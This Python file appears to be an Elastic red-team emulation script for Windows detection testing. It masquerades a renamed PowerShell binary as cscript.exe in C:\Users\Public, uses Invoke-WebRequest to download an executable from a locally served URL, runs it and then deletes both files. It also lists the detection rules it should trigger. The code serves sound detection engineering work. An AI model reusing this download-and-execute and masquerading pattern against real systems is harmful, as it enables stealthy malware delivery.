# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="6ffcba60-acde-46e2-994a-a79ec8e07ef3",
    platforms=["windows"],
    endpoint=[
        {"rule_name": "Execution from Unusual Directory", "rule_id": "16c84e67-e5e7-44ff-aefa-4d771bcafc0c"},
        {"rule_name": "Binary Masquerading via Untrusted Path", "rule_id": "35dedf0c-8db6-4d70-b2dc-a133b808211f"},
        {
            "rule_name": "Execution of a File Written by Windows Script Host",
            "rule_id": "49e47c2a-307f-4591-939a-dfdae6e5156c",
        },
        {
            "rule_name": "Suspicious Windows Script Interpreter Child Process",
            "rule_id": "83da4fac-563a-4af8-8f32-5a3797a9068e",
        },
    ],
    siem=[],
    techniques=["T1055", "T1218", "T1036", "T1059"],
)

EXE_FILE = common.get_path("bin", "renamed_posh.exe")


@common.requires_os(metadata.platforms)
def main():
    server, ip, port = common.serve_web()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    cscript = "C:\\Users\\Public\\cscript.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    common.copy_file(EXE_FILE, cscript)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    common.log("Using a fake cscript to drop and execute an .exe")
    common.execute([cscript, "/c", cmd], timeout=10)
    common.execute([cscript, "/c", dropped], timeout=10, kill=True)
    common.remove_file(cscript)
    common.remove_file(dropped)


if __name__ == "__main__":
    exit(main())
